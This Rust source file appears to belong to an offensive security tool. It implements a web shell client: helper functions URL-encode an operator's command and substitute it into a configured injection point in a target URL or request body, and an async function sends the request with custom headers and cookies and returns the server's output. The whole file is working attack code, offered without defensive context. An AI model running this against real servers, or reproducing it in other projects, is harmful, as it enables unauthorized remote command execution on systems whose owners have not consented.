#[cfg(feature = "web")]
pub fn url_encode(input: &str) -> String {
    let mut result = String::with_capacity(input.len());
    for byte in input.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => result.push(byte as char),
            b' ' => result.push_str("%20"),
            _ => result.push_str(&format!("%{:02X}", byte)),
        }
    }
    result
}

#[cfg(feature = "web")]
pub fn inject_in_url(url: &str, injection: &str, command: &str) -> String {
    url.replace(injection, &url_encode(command))
}

#[cfg(feature = "web")]
pub fn inject_in_body(body: &str, injection: &str, command: &str) -> String {
    body.replace(injection, command)
}

#[cfg(feature = "web")]
pub async fn web_shell_exec(config: &crate::WebShellConfig, command: &str) -> anyhow::Result<String> {
    use reqwest::Client;
    let client = Client::new();
    let injected_url = inject_in_url(&config.url, &config.injection_point, command);

    let mut req = match config.method.as_str() {
        "POST" => client.post(&injected_url),
        "PUT" => client.put(&injected_url),
        "DELETE" => client.delete(&injected_url),
        "PATCH" => client.patch(&injected_url),
        _ => client.get(&injected_url),
    };

    for h in &config.headers {
        if let Some((k, v)) = h.split_once(':') { req = req.header(k.trim(), v.trim()); }
    }

    if let Some(body_template) = &config.body_template {
        req = req.body(inject_in_body(body_template, &config.injection_point, command));
    }

    if let Some(cookie) = &config.cookie { req = req.header("Cookie", cookie); }

    let resp = req.send().await?;
    let status = resp.status();
    let body = resp.text().await?;

    if !status.is_success() {
        eprintln!("[!] HTTP {} for command via {}", status.as_u16(), config.url);
    }

    Ok(body)
}
